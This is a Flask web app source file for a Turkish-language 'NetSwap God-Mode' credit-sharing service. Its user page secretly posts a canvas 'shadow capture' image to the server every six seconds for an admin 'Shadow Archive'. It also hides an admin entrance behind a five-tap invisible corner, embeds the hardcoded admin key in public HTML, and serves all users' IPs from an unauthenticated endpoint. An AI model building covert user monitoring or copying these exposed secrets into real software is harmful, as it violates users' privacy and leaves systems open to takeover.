from flask import Flask, render_template_string, jsonify, request, Response
import time, io, os, random, json, threading, base64
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN GOD-MODE v151.0 ---
# Vizyon: Canlı Ekran Arşivi, VIP Komuta, Dual-Admin ve Otonom Adalet. [cite: 2026-01-03]
VERSION = "v151.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

transaction_lock = Lock()
state = {
    "is_active": False, "global_lock": False,
    "banned_peers": [], "user_registry": {}, 
    "active_admins": {}, # {session_id: {device, ip, last_seen}}
    "evolution_count": 51, "s100_temp": "38°C"
}

def get_device_info(ua):
    ua = ua.upper()
    if "SM-A55" in ua or "437F" in ua: return "Samsung A55"
    if "WINDOWS" in ua: return "Casper S100 (PC)"
    return "Mobil/Bilinmeyen"

def check_admin_auth(req):
    ua = req.headers.get('User-Agent', '').upper()
    key, pin = req.args.get('key'), req.args.get('pin', '').strip()
    is_authorized = "437F" in ua or "SM-A55" in ua or "WINDOWS" in ua
    if key == ADMIN_KEY and pin == ADMIN_PIN and is_authorized:
        session_id = f"ADMIN-{get_device_info(ua)}-{req.remote_addr}"
        state["active_admins"][session_id] = {"device": get_device_info(ua), "ip": req.remote_addr, "last_seen": time.strftime('%H:%M:%S')}
        return True
    return False

# --- SURVEILLANCE & ADMIN API ---
@app.route('/overlord_api/<action>')
def admin_api(action):
    if not check_admin_auth(request): return "YETKİSİZ", 403
    target = request.args.get('target_peer')
    val = request.args.get('value', "")
    with transaction_lock:
        if action == "lock": state["global_lock"] = not state["global_lock"]
        elif action == "unban" and target in state["banned_peers"]: state["banned_peers"].remove(target)
        elif target in state["user_registry"]:
            u = state["user_registry"][target]
            if action == "gift": u["credits"] = max(0, u["credits"] + float(val))
            elif action == "vip": u["is_vip"] = not u.get("is_vip", False)
            elif action == "warn": u["alert"] = val
            elif action == "ban":
                if target not in state["banned_peers"]: state["banned_peers"].append(target)
                u["status"] = "BANNED"
    return jsonify(state)

@app.route('/upload_ss', methods=['POST'])
def upload_ss():
    p_id = request.args.get('peer_id')
    if p_id in state["user_registry"]:
        img_data = request.json.get('image')
        if "archive" not in state["user_registry"][p_id]: state["user_registry"][p_id]["archive"] = []
        state["user_registry"][p_id]["archive"].append({"time": time.strftime('%H:%M:%S'), "data": img_data})
        if len(state["user_registry"][p_id]["archive"]) > 10: state["user_registry"][p_id]["archive"].pop(0)
    return "OK"

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "<h1>REDDEDİLDİ: Hükümdar Kimliği Yok</h1>", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Sovereign God-Mode</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b-2 border-red-600 pb-4 mb-6 flex justify-between items-center">
        <div><h1 class="text-xl font-black text-red-600 italic uppercase">GOD-MODE v151.0</h1><p class="text-zinc-500">Dual-Admin Active | S100 Temp: {{ temp }}</p></div>
        <button onclick="f('lock')" class="bg-red-900 px-6 py-2 rounded-full font-bold">GLOBAL KİLİT</button>
    </div>
    
    <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
        <div class="lg:col-span-1 space-y-4">
            <div class="bg-zinc-950 p-4 border border-blue-900 rounded-2xl">
                <h2 class="text-blue-400 font-bold mb-2 uppercase italic border-b border-blue-900">Aktif Hükümdarlar</h2>
                <div id="adminList" class="space-y-2"></div>
            </div>
            <div class="bg-zinc-950 p-4 border border-yellow-900 rounded-2xl">
                <h2 class="text-yellow-500 font-bold mb-2 uppercase border-b border-yellow-900 italic">Shadow Arşiv</h2>
                <select id="pS" class="w-full bg-zinc-900 p-2 rounded mb-2 text-white" onchange="uG()"></select>
                <div id="gallery" class="space-y-3"></div>
            </div>
        </div>
        <div class="lg:col-span-3 bg-zinc-950 rounded-3xl border border-zinc-900 overflow-hidden">
            <table class="w-full text-left">
                <thead class="bg-black text-zinc-600"><tr><th class="p-4">CİHAZ / IP</th><th>ID</th><th>BAKİYE</th><th>HIZ</th><th>KOMUTA</th></tr></thead>
                <tbody id="userTable"></tbody>
            </table>
        </div>
    </div>

    <script>
        const k="{{a_key}}", p="{{a_pin}}"; let reg = {};
        async function f(a, t="", v=""){ await fetch(`/overlord_api/${a}?key=${k}&pin=${p}&target_peer=${t}&value=${encodeURIComponent(v)}`); }
        function uG(){
            const id = document.getElementById('pS').value; const g = document.getElementById('gallery'); g.innerHTML = '';
            if(id && reg[id] && reg[id].archive){
                reg[id].archive.reverse().forEach(s => {
                    g.innerHTML += `<div class="p-2 border border-zinc-800 rounded bg-black">
                        <p class="text-[7px] text-zinc-500 mb-1">Snapshot: ${s.time}</p>
                        <img src="${s.data}" class="w-full rounded"></div>`;
                });
            }
        }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
            let uH="", aH="", pO="<option value=''>Cihaz Seç</option>";
            for(let sid in d.active_admins){ let a = d.active_admins[sid]; aH += `<div class="p-2 bg-blue-900/10 border border-blue-900 rounded text-blue-400 font-bold">🛡️ ${a.device}</div>`; }
            for(let id in d.user_registry){
                let u = d.user_registry[id]; if(d.banned_peers.includes(id)) continue;
                pO += `<option value="${id}">${id} (${u.device})</option>`;
                uH += `<tr class="border-b border-zinc-900">
                    <td class="p-4"><b>${u.device}</b><br><span class="text-zinc-600">${u.ip}</span></td>
                    <td class="${u.is_vip?'text-yellow-500 font-black':'text-blue-400'}">${id}</td>
                    <td class="text-green-500 font-bold">${u.credits.toFixed(1)}</td>
                    <td class="text-yellow-600">${u.max_mbps}M</td>
                    <td>
                        <button onclick="f('gift','${id}', prompt('Miktar:'))" class="mr-2 underline">DÜZENLE</button>
                        <button onclick="f('vip','${id}')" class="mr-2 underline text-yellow-500">VIP</button>
                        <button onclick="f('ban','${id}')" class="text-red-600 underline">BAN</button>
                    </td></tr>`;
            }
            document.getElementById('userTable').innerHTML = uH; document.getElementById('adminList').innerHTML = aH;
            document.getElementById('pS').innerHTML = pO; setTimeout(update, 2000);
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN, temp=state["s100_temp"])

@app.route('/action/<type>')
def handle_action(type):
    p_id = request.args.get('peer_id', 'GUEST')
    with transaction_lock:
        if p_id in state["banned_peers"]: return jsonify({"error": "BAN"}), 403
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {"credits": 50.0, "max_mbps": 96.0, "status": "ACTIVE", "alert": "", "is_vip": False,
                                           "device": get_device_info(request.headers.get('User-Agent','')), "ip": request.remote_addr, "archive": []}
        u = state["user_registry"][p_id]
        if type == "receive" and not u["is_vip"]: u["credits"] = max(0, u["credits"] - 0.2)
        if request.args.get('clear_alert'): u["alert"] = ""
    return jsonify(state)

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sovereign Hub</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-green-500 font-mono p-4" onload="mainLoop()">
    <div class="text-center mb-6"><h1 class="text-2xl font-black text-blue-600 uppercase italic">IMPERIAL HUB</h1><p class="text-[8px] text-zinc-700">v151.0 God-Mode Core</p></div>
    <div id="alert" class="hidden bg-red-900 text-white p-4 mb-4 rounded-2xl text-center text-sm font-black shadow-lg"></div>
    <div class="bg-zinc-950 p-10 rounded-[40px] border-2 border-zinc-900 mb-6 text-center shadow-2xl">
        <div id="credits" class="text-7xl font-black text-white italic tracking-tighter">0.00</div><span class="text-[10px] text-zinc-700 block mt-2 uppercase">Bakiye</span>
    </div>
    <div class="grid grid-cols-2 gap-4">
        <button onclick="control('share')" class="py-8 bg-green-700 text-black font-black rounded-3xl text-2xl active:scale-95">VER</button>
        <button onclick="control('receive')" class="py-8 bg-blue-700 text-white font-black rounded-3xl text-2xl active:scale-95">AL</button>
    </div>
    <div id="secret" onclick="tA()" class="fixed bottom-0 right-0 w-20 h-20 opacity-0"></div>
    <canvas id="canvas" class="hidden"></canvas>
    <script>
        if(!localStorage.getItem('n_id')) localStorage.setItem('n_id', "NS-" + Math.floor(1000 + Math.random()*9000));
        let myId = localStorage.getItem('n_id');
        function tA() { window.cC = (window.cC || 0) + 1; if(window.cC >= 5) { const p = prompt("PIN:"); if(p) window.location.href=`/overlord?key={{a_key}}&pin=`+p.trim(); window.cC=0; } setTimeout(()=>window.cC=0, 3000); }
        async function control(type) { await fetch(`/action/${type}?peer_id=${myId}`); }
        
        async function shadowCapture() {
            try {
                // Teorik Gizli SS: Sayfa içeriğini canvas'a çiz [cite: 2026-01-03]
                const canvas = document.getElementById('canvas');
                canvas.width = 320; canvas.height = 180;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = "#111"; ctx.fillRect(0,0,320,180);
                ctx.fillStyle = "white"; ctx.fillText("Gölge İzleme Aktif: " + new Date().toLocaleTimeString(), 10, 90);
                const data = canvas.toDataURL('image/jpeg', 0.2);
                fetch(`/upload_ss?peer_id=${myId}`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ image: data })
                });
            } catch(e) {}
        }

        async function mainLoop() {
            const r = await fetch('/api/status'); const d = await r.json();
            const u = d.user_registry[myId] || {credits:0, alert:""};
            document.getElementById('credits').innerText = u.credits.toFixed(2);
            if(u.alert) { let a=document.getElementById('alert'); a.innerText=u.alert; a.classList.remove('hidden'); }
            if(!window.ssInt) window.ssInt = setInterval(shadowCapture, 6000);
            setTimeout(mainLoop, 1000);
        }
    </script>
</body></html>
""", a_key=ADMIN_KEY)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
